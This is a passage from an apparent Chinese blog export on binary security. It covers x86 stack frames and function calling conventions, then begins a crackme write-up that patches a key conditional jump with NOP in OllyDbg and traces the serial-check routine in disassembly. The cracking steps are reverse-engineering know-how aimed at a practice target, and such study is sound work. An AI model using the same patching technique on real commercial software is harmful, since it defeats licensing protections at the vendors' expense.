<p>   <strong>出栈**</strong>(pop)**：栈顶指针ESP指向的栈中数据被取回到寄存器；栈顶指针ESP增加4个字节。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/271656343069114.jpg" alt="img"></p>
<p>可见，压栈操作将寄存器内容存入栈内存中(寄存器原内容不变)，栈顶地址减小；出栈操作从栈内存中取回寄存器内容(栈内已存数据不会自动清零)，栈顶地址增大。栈顶指针ESP总是指向栈中下一个可用数据。</p>
<p>   <strong>调用**</strong>(<strong><strong>call</strong></strong>)**：将当前的指令指针EIP(该指针指向紧接在call指令后的下条指令)压入堆栈，以备返回时能恢复执行下条指令；然后设置EIP指向被调函数代码开始处，以跳转到被调函数的入口地址执行。</p>
<p>   <strong>离开**</strong>(leave)**： 恢复主调函数的栈帧以准备返回。等价于指令序列movl %ebp, %esp(恢复原ESP值，指向被调函数栈帧开始处)和popl %ebp(恢复原ebp的值，即主调函数帧基指针)。</p>
<p>   <strong>返回**</strong>(ret)**：与call指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前call指令保存的下条指令地址)到EIP寄存器中，程序转到该地址处继续执行(此时ESP指向进入函数时的第一个参数)。若带立即数，ESP再加立即数(丢弃一些在执行call前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前call指令保存的返回地址。</p>
<p>基于以上指令，使用C调用约定的被调函数典型的函数序和函数跋实现如下：</p>
<table>
<thead>
<tr>
<th></th>
<th><strong>指令序列</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>函数序(prologue)</td>
<td>push %ebp</td>
<td>将主调函数的帧基指针%ebp压栈，即保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧</td>
</tr>
<tr>
<td>mov %esp, %ebp</td>
<td>将主调函数的栈顶指针%esp赋给被调函数帧基指针%ebp。此时，%ebp指向被调函数新栈帧的起始地址(栈底)，亦即旧%ebp入栈后的栈顶</td>
<td></td>
</tr>
<tr>
<td>sub <n>, %esp</n></td>
<td>将栈顶指针%esp减去指定字节数(栈顶下移)，即为被调函数局部变量开辟栈空间。<n>为立即数且通常为16的整数倍(可能大于局部变量字节总数而稍显浪费，但gcc采用该规则保证数据的严格对齐以有效运用各种优化编译技术)</n></td>
<td></td>
</tr>
<tr>
<td>push <r></r></td>
<td>可选。如有必要，被调函数负责保存某些寄存器(%edi/%esi/%ebx)值</td>
<td></td>
</tr>
<tr>
<td>函数跋(epilogue)</td>
<td>pop <r></r></td>
<td>可选。如有必要，被调函数负责恢复某些寄存器(%edi/%esi/%ebx)值</td>
</tr>
<tr>
<td>mov %ebp, %esp*</td>
<td>恢复主调函数的栈顶指针%esp，将其指向被调函数栈底。此时，局部变量占用的栈空间被释放，但变量内容未被清除(跳过该处理)</td>
<td></td>
</tr>
<tr>
<td>pop %ebp*</td>
<td>主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处</td>
<td></td>
</tr>
<tr>
<td>ret</td>
<td>从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈</td>
<td></td>
</tr>
<tr>
<td></td>
<td>*：这两条指令序列也可由leave指令实现，具体用哪种方式由编译器决定。</td>
<td></td>
</tr>
</tbody></table>
<p> 若主调函数和调函数均未使用局部变量寄存器EDI、ESI和EBX，则编译器无须在函数序中对其压栈，以便提高程序的执行效率。</p>
<p>   参数压栈指令因编译器而异，如下两种压栈方式基本等效：</p>
<table>
<thead>
<tr>
<th>extern CdeclDemo(int w, int x, int y, intz); //调用CdeclDemo函数</th>
<th>CdeclDemo(1, 2, 3, 4); //调用CdeclDemo函数</th>
</tr>
</thead>
<tbody><tr>
<td><strong>压栈方式一</strong></td>
<td><strong>压栈方式二</strong></td>
</tr>
<tr>
<td>pushl 4 //压入参数zpushl 3 //压入参数ypushl 2 //压入参数xpushl 1 //压入参数wcall CdeclDemo  //调用函数addl $16, %esp //恢复ESP原值，使其指向调用前保存的返回地址</td>
<td><em>subl  $16, %esp</em> //多次调用仅执行一遍movl $4, 12(%esp) //传送参数z至堆栈第四个位置movl $3, 8(%esp) //传送参数y至堆栈第三个位置movl $2, 4(%esp) //传送参数x至堆栈第二个位置movl $1, (%esp) //传送参数w至堆栈栈顶call CdeclDemo  //调用函数</td>
</tr>
</tbody></table>
<p> 两种压栈方式均遵循C调用约定，但方式二中主调函数在调用返回后并未显式清理堆栈空间。因为在被调函数序阶段，编译器在栈顶为函数参数预先分配内存空间(sub指令)。函数参数被复制到栈中(而非压入栈中)，并未修改栈顶指针，故调用返回时主调函数也无需修改栈顶指针。gcc3.4(或更高版本)编译器采用该技术将函数参数传递至栈上，相比栈顶指针随每次参数压栈而多次下移，一次性设置好栈顶指针更为高效。设想连续调用多个函数时，方式二仅需预先分配一次参数内存(大小足够容纳参数尺寸和最大的函数即可)，后续调用无需每次都恢复栈顶指针。注意，函数被调用时，两种方式均使栈顶指针指向函数最左边的参数。本文不再区分两种压栈方式，”压栈”或”入栈”所提之处均按相应汇编代码理解，若无汇编则指方式二。</p>
<p>   某些情况下，编译器生成的函数调用进入/退出指令序列并不按照以上方式进行。例如，若C函数声明为static(只在本编译单元内可见)且函数在编译单元内被直接调用，未被显示或隐式取地址(即没有任何函数指针指向该函数)，此时编译器确信该函数不会被其它编译单元调用，因此可随意修改其进/出指令序列以达到优化目的。</p>
<p>   尽管使用的寄存器名字和指令在不同处理器架构上有所不同，但创建栈帧的基本过程一致。</p>
<p>   注意，栈帧是运行时概念，若程序不运行，就不存在栈和栈帧。但通过分析目标文件中建立函数栈帧的汇编代码(尤其是函数序和函数跋过程)，即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用。</p>
<p>参考链接：<a href="https://www.cnblogs.com/clover-toeic/p/3755401.html">https://www.cnblogs.com/clover-toeic/p/3755401.html</a></p>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言函数调用栈(二)</title>
    <url>/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88-%E4%BA%8C/</url>
    <content><![CDATA[<h1 id="5-函数调用约定"><a href="#5-函数调用约定" class="headerlink" title="5 函数调用约定"></a>5 函数调用约定</h1><p>   创建一个栈帧的最重要步骤是主调函数如何向栈中传递函数参数。主调函数必须精确存储这些参数，以便被调函数能够访问到它们。函数通过选择特定的调用约定，来表明其希望以特定方式接收参数。此外，当被调函数完成任务后，调用约定规定先前入栈的参数由主调函数还是被调函数负责清除，以保证程序的栈顶指针完整性。</p>
<a id="more"></a>

<p>   函数调用约定通常规定如下几方面内容：</p>
<p>   1) 函数参数的传递顺序和方式</p>
<p>   最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能。</p>
<p>   2) 栈的维护方式</p>
<p>   主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由主调函数负责完成，也可由被调函数负责完成。</p>
<p>   3) 名字修饰(Name-mangling)策略</p>
<p>   又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。</p>
<p>   若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。</p>
<h2 id="5-1-常见调用约定"><a href="#5-1-常见调用约定" class="headerlink" title="5.1 常见调用约定"></a>5.1 常见调用约定</h2><p>   下面分别介绍常见的几种函数调用约定。</p>
<p>   <strong>1. cdecl**</strong>调用约定**</p>
<p>   又称C调用约定，是C/C++编译器默认的函数调用约定。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式。函数参数按照从右到左的顺序入栈，函数调用者负责清除栈中的参数，返回值在EAX中。由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)。但cdecl调用方式支持可变参数函数(即函数带有可变数目的参数，如printf)，且调用时即使实参和形参数目不符也不会导致堆栈错误。对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。 </p>
<blockquote>
<p>【扩展阅读】<strong>可变参数函数支持条件</strong></p>
<p>若要支持可变参数的函数，则参数应自右向左进栈，并且由主调函数负责清除栈中的参数(参数出栈)。</p>
<p>首先，参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如printf函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错！</p>
<p>其次，调用函数将参数压栈，只有它才知道栈中的参数数目和尺寸，因此调用函数可安全地清栈。而被调函数永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整。</p>
<p>C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态。</p>
</blockquote>
<p> <strong>2. stdcall**</strong>调用约定<strong><strong>(</strong></strong>微软命名<strong>**)</strong></p>
<p>   Pascal程序缺省调用方式，WinAPI也多采用该调用约定。stdcall调用约定主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由被调函数负责清除栈中的参数，返回值在EAX中。stdcall调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，如_functionname@number。</p>
<p><strong>3. fastcall**</strong>调用约定**</p>
<p>   stdcall调用约定的变形，通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈，被调函数在返回前负责清除栈中的参数，返回值在 EAX 中。因为并不是所有的参数都有压栈操作，所以比stdcall和cdecl快些。编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意fastcall函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突。</p>
<p>   <strong>4. thiscall**</strong>调用约定**</p>
<p>   C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。</p>
<p>   thiscall调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。thiscall不是C++关键字，故不能使用thiscall声明函数，它只能由编译器使用。</p>
<p>   注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%ecx寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。</p>
<p>   <strong>5. naked call**</strong>调用约定**</p>
<p>   对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call。该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数：</p>
<p>   代码示例如下(Windows采用Intel汇编语法，注释符为;)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__declspec(naked) int __stdcall function(int a, int b) &#123;</span><br><span class="line">  ;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T)</span><br><span class="line">  __asm mov eax, a</span><br><span class="line">  __asm add eax, b</span><br><span class="line">  __asm ret 8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>6. pascal**</strong>调用约定**</p>
<p>   Pascal语言调用约定，参数按照从左至右的顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。</p>
<p>   Win3.X(16位)时支持真正的pascal调用约定；而Win9.X(32位)以后pascal约定由stdcall约定代替(以C约定压栈以Pascal约定清栈)。</p>
<p>   上述调用约定的主要特点如下表所示：</p>
<table>
<thead>
<tr>
<th><strong>调用方式</strong></th>
<th><strong>stdcall(Win32)</strong></th>
<th><strong>cdecl</strong></th>
<th><strong>fastcall</strong></th>
<th><strong>thiscall(C++)</strong></th>
<th><strong>naked call</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>参数压栈顺序</strong></td>
<td>从右至左</td>
<td>从右至左</td>
<td>从右至左，Arg1在ecx，Arg2在edx</td>
<td>从右至左，this指针在ecx</td>
<td>自定义</td>
</tr>
<tr>
<td><strong>参数位置</strong></td>
<td>栈</td>
<td>栈</td>
<td>栈 + 寄存器</td>
<td>栈，寄存器ecx</td>
<td>自定义</td>
</tr>
<tr>
<td><strong>负责清栈的函数</strong></td>
<td>被调函数</td>
<td>主调函数</td>
<td>被调函数</td>
<td>被调函数</td>
<td>自定义</td>
</tr>
<tr>
<td><strong>支持可变参数</strong></td>
<td>否</td>
<td>是</td>
<td>否</td>
<td>否</td>
<td>自定义</td>
</tr>
<tr>
<td><strong>函数名字格式</strong></td>
<td>_name@number</td>
<td>_name</td>
<td>@name@number</td>
<td></td>
<td>自定义</td>
</tr>
<tr>
<td><strong>参数表开始标识</strong></td>
<td>“@@YG”</td>
<td>“@@YA”</td>
<td>“@@YI”</td>
<td></td>
<td>自定义</td>
</tr>
</tbody></table>
<p>注：C++因支撑函数重载、命名空间和成员函数等语法特征，采用更为复杂的名字修饰策略。</p>
<p>C++函数修饰名以”?”开始，后面紧跟函数名、参数表开始标识和按照类型代号拼出的返回值参数表。</p>
<p>例如，函数int Function(char *var1,unsigned long)对应的stdcall修饰名为”?Function@@YGHPADK@Z”。</p>
<p>  Windows下可直接在函数声明前添加关键字<strong>stdcall、</strong>cdecl或<strong>fastcall等标识确定函数的调用方式，如int __stdcall func()。Linux下可借用函数attribute 机制，如int __attribute</strong>((<strong>stdcall</strong>)) func()。</p>
<p>   代码示例如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __attribute__((__cdecl__)) CalleeFunc(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> k)&#123;</span><br><span class="line"><span class="comment">// int __attribute__((__stdcall__)) CalleeFunc(int i, int j, int k)&#123;</span></span><br><span class="line"><span class="comment">//int __attribute__((__fastcall__)) CalleeFunc(int i, int j, int k)&#123;</span></span><br><span class="line">    <span class="keyword">return</span> i+j+k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CallerFunc</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    CalleeFunc(<span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    CallerFunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 被调函数CalleeFunc分别声明为cdecl、stdcall和fastcall约定时，其汇编代码比较如下表所示：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201112152431087.png" alt="image-20201112151736782"></p>
<h2 id="5-2-调用约定影响"><a href="#5-2-调用约定影响" class="headerlink" title="5.2 调用约定影响"></a>5.2 调用约定影响</h2><p>   当函数导出被其他程序员所使用(如库函数)时，该函数应遵循主要的调用约定，以便于程序员使用。若函数仅供内部使用，则其调用约定可只被使用该函数的程序所了解。</p>
<p>   在多语言混合编程(包括A语言中使用B语言开发的第三方库)时，若函数的原型声明和函数体定义不一致或调用函数时声明了不同的函数约定，将可能导致严重问题(如堆栈被破坏)。</p>
<p>   以Delphi调用C函数为例。Delphi函数缺省采用stdcall调用约定，而C函数缺省采用cdecl调用约定。一般将C函数声明为stdcall约定，如：int __stdcall add(int a, int b);</p>
<p>   在Delphi中调用该函数时也应声明为stdcall约定：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function add(a: Integer; b: Integer): Integer; stdcall; &#x2F;&#x2F;参数类型应与DLL中的函数或过程参数类型一致，且引用时使用stdcall参数</span><br><span class="line">external &#39;a.dll&#39;; &#x2F;&#x2F;指定被调DLL文件的路径和名称</span><br></pre></td></tr></table></figure>

<p>不同编译器产生栈帧的方式不尽相同，主调函数不一定能正常完成清栈工作；而被调函数必然能自己完成正常清栈，因此，在跨(开发)平台调用中，通常使用stdcall调用约定(不少WinApi均采用该约定)。</p>
<p>   此外，主调函数和被调函数所在模块采用相同的调用约定，但分别使用C++和C语法编译时，会出现链接错误(报告被调函数未定义)。这是因为两种语言的函数名字修饰规则不同，解决方式是使用extern “C”告知主调函数所在模块：被调函数是C语言编译的。采用C语言编译的库应考虑到使用该库的程序可能是C++程序(使用C++编译器)，通常应这样声明头文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ifdef _cplusplus</span><br><span class="line">    extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line">    type Func(type para);</span><br><span class="line">#ifdef _cplusplus</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>

<p>   这样C++编译器就会按照C语言修饰策略链接Func函数名，而不会出现找不到函数的链接错误。</p>
<h2 id="5-3-x86函数参数传递方法"><a href="#5-3-x86函数参数传递方法" class="headerlink" title="5.3 x86函数参数传递方法"></a>5.3 x86函数参数传递方法</h2><p>   x86处理器ABI规范中规定，所有传递给被调函数的参数都通过堆栈来完成，其压栈顺序是以函数参数从右到左的顺序。当向被调函数传递参数时，所有参数最后形成一个数组。由于采用从右到左的压栈顺序，数组中参数的顺序(下标0<del>N-1)与函数参数声明顺序(Para1</del>N)一致。因此，在函数中若知道第一个参数地址和各参数占用字节数，就可通过访问数组的方式去访问每个参数。</p>
<h3 id="5-3-1-整型和指针参数的传递"><a href="#5-3-1-整型和指针参数的传递" class="headerlink" title="5.3.1 整型和指针参数的传递"></a>5.3.1 整型和指针参数的传递</h3><p>   整型参数与指针参数的传递方式相同，因为在32位x86处理器上整型与指针大小相同(均为四字节)。下表给出这两种类型的参数在栈帧中的位置关系。注意，该表基于tail函数的栈帧。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201112152431087.png" alt="image-20201112152424068"></p>
<h3 id="5-3-2-浮点参数的传递"><a href="#5-3-2-浮点参数的传递" class="headerlink" title="5.3.2 浮点参数的传递"></a>5.3.2 浮点参数的传递</h3><p>   浮点参数的传递与整型类似，区别在于参数大小。x86处理器中浮点类型占8个字节，因此在栈中也需要占用8个字节。下表给出浮点参数在栈帧中的位置关系。图中，调用tail函数的第一个和第三个参数均为浮点类型，因此需各占用8个字节，三个参数共占用20个字节。表中word类型的大小是4字节。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201112152431087.png" alt="image-20201112152431087"></p>
<h3 id="5-3-3-结构体和联合体参数的传递"><a href="#5-3-3-结构体和联合体参数的传递" class="headerlink" title="5.3.3 结构体和联合体参数的传递"></a>5.3.3 结构体和联合体参数的传递</h3><p>   结构体和联合体参数的传递与整型、浮点参数类似，只是其占用字节大小视数据结构的定义不同而异。x86处理器上栈宽是4字节，故结构体在栈上所占用的字节数为4的倍数。编译器会对结构体进行适当的填充以使得结构体大小满足4字节对齐的要求。</p>
<p>   对于一些RISC处理器(如PowerPC)，其参数传递并不是全部通过栈来实现。PowerPC处理器寄存器中，R3～R10共8个寄存器用于传递整型或指针参数，F1～F8共8个寄存器用于传递浮点参数。当所需传递的参数少于8个时，不需要用到栈。结构体和long double参数的传递通过指针来完成，这与x86处理器完全不同。PowerPC的ABI规范中规定，结构体的传递采用指针方式，而不是像x86处理器那样将结构从一个函数栈帧中拷贝到另一个函数栈帧中，显然x86处理器的方式更低效。可见，PowerPC程序中，函数参数采用指向结构体的指针(而非结构体)并不能提高效率，不过通常这是良好的编程习惯。</p>
<p> 5.4 x86函数返回值传递方法</p>
<p>   函数返回值可通过寄存器传递。当被调用函数需要返回结果给调用函数时<strong>：</strong></p>
<p>   1) 若返回值不超过4字节(如int、short、char、指针等类型)，通常将其保存在EAX寄存器中，调用方通过读取EAX获取返回值。</p>
<p>   2) 若返回值大于4字节而小于8字节(如long long或_int64类型)，则通过EAX+EDX寄存器联合返回，其中EDX保存返回值高4字节，EAX保存返回值低4字节。</p>
<p>   3) 若返回值为浮点类型(如float和double)，则通过专用的协处理器浮点数寄存器栈的栈顶返回。</p>
<p>   4) 若返回值为结构体或联合体，则主调函数向被调函数传递一个额外参数，该参数指向将要保存返回值的地址。即函数调用foo(p1, p2)被转化为foo(&amp;p0, p1, p2)，以引用型参数形式传回返回值。具体步骤可能为：a.主调函数将显式的实参逆序入栈；b.将接收返回值的结构体变量地址作为隐藏参数入栈(若未定义该接收变量，则在栈上额外开辟空间作为接收返回值的临时变量)；c. 被调函数将待返回数据拷贝到隐藏参数所指向的内存地址，并将该地址存入%eax寄存器。因此，在被调函数中完成返回值的赋值工作。</p>
<p>   注意，函数如何传递结构体或联合体返回值依赖于具体实现。不同编译器、平台、调用约定甚至编译参数下可能采用不同的实现方法。如VC6编译器对于不超过8字节的小结构体，会通过EAX+EDX寄存器返回。而对于超过8字节的大结构体，主调函数在栈上分配用于接收返回值的临时结构体，并将地址通过栈传递给被调函数；被调函数根据返回值地址设置返回值(拷贝操作)；调用返回后主调函数根据需要，再将返回值赋值给需要的临时变量(二次拷贝)。实际使用中为提高效率，通常将结构体指针作为实参传递给被调函数以接收返回值。</p>
<p>   5) 不要返回指向栈内存的指针，如返回被调函数内局部变量地址(包括局部数组名)。因为函数返回后，其栈帧空间被“释放”，原栈帧内分配的局部变量空间的内容是不稳定和不被保证的。</p>
<p>   函数返回值通过寄存器传递，无需空间分配等操作，故返回值的代价很低。基于此原因，C89规范中约定，不写明返回值类型的函数，返回值类型默认为int。但这会带来类型安全隐患，如函数定义时返回值为浮点数，而函数未声明或声明时未指明返回值类型，则调用时默认从寄存器EAX(而不是浮点数寄存器)中获取返回值，导致错误！因此在C++中，不写明返回值类型的函数返回值类型为void，表示不返回值。</p>
<blockquote>
<p>【扩展阅读】<strong>GCC**</strong>返回结构体和联合体**</p>
<p>通常GCC被配置为使用与目标系统一致的函数调用约定。这通过机器描述宏来实现。但是，在一些目标机上采用不同方式返回结构体和联合体的值。因此，使用PCC编译的返回这些类型的函数不能被使用GCC编译的代码调用，反之亦然。但这并未造成麻烦，因为很少有Unix库函数返回结构体或联合体。</p>
<p>GCC代码使用存放int或double类型返回值的寄存器来返回1、2、4或8个字节的结构体和联合体(GCC通常还将此类变量分配在寄存器中)。其它大小的结构体和联合体在返回时，将其存放在一个由调用者传递的地址中(通常在寄存器中)。</p>
<p>相比之下，PCC在大多目标机上返回任何大小的结构体和联合体时，都将数据复制到一个静态存储区域，再将该地址当作指针值返回。调用者必须将数据从那个内存区域复制到需要的地方。这比GCC使用的方法要慢，而且不可重入。</p>
<p>在一些目标机上(如RISC机器和80386)，标准的系统约定是将返回值的地址传给子程序。在这些机器上，当使用这种约定方法时，GCC被配置为与标准编译器兼容。这可能会对于1，2，4或8字节的结构体不兼容。</p>
<p>GCC使用系统的标准约定来传递参数。在一些机器上，前几个参数通过寄存器传递；在另一些机器上，所有的参数都通过栈传递。原本可在所有机器上都使用寄存器来传递参数，而且此法还可能显著提高性能。但这样就与使用标准约定的代码完全不兼容。所以这种改变只在将GCC作为系统唯一的C编译器时才实用。当拥有一套完整的GNU 系统，能够用GCC来编译库时，可在特定机器上实现寄存器参数传递。</p>
<p>在一些机器上(特别是SPARC)，一些类型的参数通过“隐匿引用”(invisible reference)来传递。这意味着值存储在内存中，将值的内存地址传给子程序。</p>
</blockquote>
<p>参考链接：<a href="https://www.cnblogs.com/clover-toeic/p/3756668.html">https://www.cnblogs.com/clover-toeic/p/3756668.html</a></p>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>crackme-系列之-crackme2</title>
    <url>/2020/12/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme2/</url>
    <content><![CDATA[<h2 id="首先打开进行查看"><a href="#首先打开进行查看" class="headerlink" title="首先打开进行查看"></a>首先打开进行查看</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32415.png" alt></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32418.png" alt></p>
<a id="more"></a>

<p>拖入od 中进行查看 定位关键语句 发现关键跳 跟踪将</p>
<p>走到je的时候发现跳转已实现 那么我们可以先双击寄存器窗口的Z右边的1 改为0 此时会变成跳转未实现 线条也由红变白由此可知je 为关键跳进行 nop 操作即可成功暴破</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32421.png" alt></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32424.png" alt></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32426.png" alt></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32436.png" alt></p>
<p>多选中几行，右键复制到可执行文件 所有修改 接着全部复制</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32443.png" alt></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32445.png" alt></p>
<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p><a href="https://www.52pojie.cn/thread-264394-1-1.html">https://www.52pojie.cn/thread-264394-1-1.html</a></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32451.png" alt></p>
<p><strong>由于我们在跳转附近没有发现任何类注册码的东西，所以，我们需要将这里块的内容F8跟踪一下，大概地看看那些地方可能和注册码相关。我们向上查找，在这段程序的开头(即找到最近的那个retn,下面开头一般是push ebp等)下断点：</strong></p>
<p><strong>00402310  &gt; \55        push ebp // 程序段头</strong></p>
<p>单步F8跟踪，将重要信息添加注释，特别是和Name/Serial相关的东西，分析后代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00402403   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">00402409   &gt;  8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]</span><br><span class="line">0040240F   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]</span><br><span class="line">00402412   .  50            push eax                                       ;  &#x2F;&#x2F;eax&#x3D;111222,name</span><br><span class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]</span><br><span class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;]   ;  MSVBVM50.__vbaLenBstr</span><br><span class="line">0040241B   .  8BF8          mov edi,eax                                    ;  edi&#x3D;6</span><br><span class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]                ;  ecx&#x3D;1111222地址</span><br><span class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                           ;  &#x2F;&#x2F; 乘法,edi*0x17CFB</span><br><span class="line">00402426   .  51            push ecx</span><br><span class="line">00402427   .  0F80 91020000 jo 004026BE</span><br><span class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;]           ;  MSVBVM50.rtcAnsiValueBstr</span><br><span class="line">00402433   .  0FBFD0        movsx edx,ax</span><br><span class="line">00402436   .  03FA          add edi,edx                                    ;  &#x2F;&#x2F; edi&#x3D;edi+edx（0x31）</span><br><span class="line">00402438   .  0F80 80020000 jo 004026BE</span><br><span class="line">0040243E   .  57            push edi</span><br><span class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;]     ;  MSVBVM50.__vbaStrI4</span><br><span class="line">00402445   .  8BD0          mov edx,eax                                    ;  &#x2F;&#x2F; eax&#x3D;585235</span><br><span class="line">00402447   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">0040244A   .  FF15 70414000 call dword ptr 